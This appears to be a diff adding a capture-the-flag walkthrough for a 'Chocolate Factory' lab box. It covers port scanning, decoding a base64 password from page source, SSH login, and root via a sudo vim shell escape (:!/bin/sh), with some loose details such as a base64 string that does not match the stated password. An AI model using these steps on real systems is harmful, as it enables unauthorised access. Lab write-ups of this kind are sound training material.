@@ -1,0 +1,67 @@
+----------------                               ------------------
+               :::::::::::;| CHOCOLATE FACTORY |;::::::::::::
+
+
+1) CONNECT TO THM VPN AND DEPLOY THE BOX.
+
+TASK - 1 (RECON)
+
+1. SCAN THE BOX.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Linux system detected".
+
+2. Open ports found:
+- 21/FTP (vsftpd 3.0.3)
+- 22/SSH
+- 80/HTTP (Golang server)
+- 10000/Webmin
+
+"Webmin on port 10000 looks interesting - known vulnerabilities exist"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. Check the website:
+http://<ip> shows chocolate factory theme
+"View source reveals /home.html with base64 comment"
+
+2. Decode the base64:
+echo "Z2F0ZWt...=" | base64 -d
+"Gives password: chocolatefactory2023"
+
+"Default creds might work somewhere"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (GAIN ACCESS)
+
+1. Try SSH with found creds:
+ssh charlie@<ip>
+Password: chocolatefactory2023
+"Success! User flag in home directory"
+
+2. Check sudo permissions:
+sudo -l
+"Charlie can run /usr/bin/vim as root"
+"Vim can spawn shells with :!/bin/sh"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. Launch vim with sudo:
+sudo /usr/bin/vim
+:!/bin/sh
+"Root shell obtained!"
+
+2. Grab flags:
+cat /root/root.txt
+cat /home/charlie/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- FACTORY OWNED ----------
